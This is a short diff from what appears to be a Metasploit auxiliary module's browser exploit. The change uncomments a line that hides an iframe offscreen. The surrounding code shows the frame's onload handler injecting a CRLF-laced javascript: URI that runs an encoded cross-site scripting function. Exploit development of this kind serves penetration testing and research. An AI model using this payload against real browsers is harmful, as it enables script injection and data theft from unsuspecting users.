@@ -164,7 +164,7 @@ class Metasploit3 < Msf::Auxiliary
 
       var brokenFrame = document.createElement('iframe');
       brokenFrame.src = 'http://localhost:100';
-      //brokenFrame.setAttribute('style', 'position:absolute;left:-1000px;height:0;width:0;visibility:hidden;')
+      brokenFrame.setAttribute('style', 'position:absolute;left:-1000px;height:0;width:0;visibility:hidden;')
       brokenFrame.onload = function() {
         brokenFrame.onload = null;
         document.documentURI = 'javascript://hostname.com/%0D%0A('+encodeURIComponent(xss.toString())+')()';
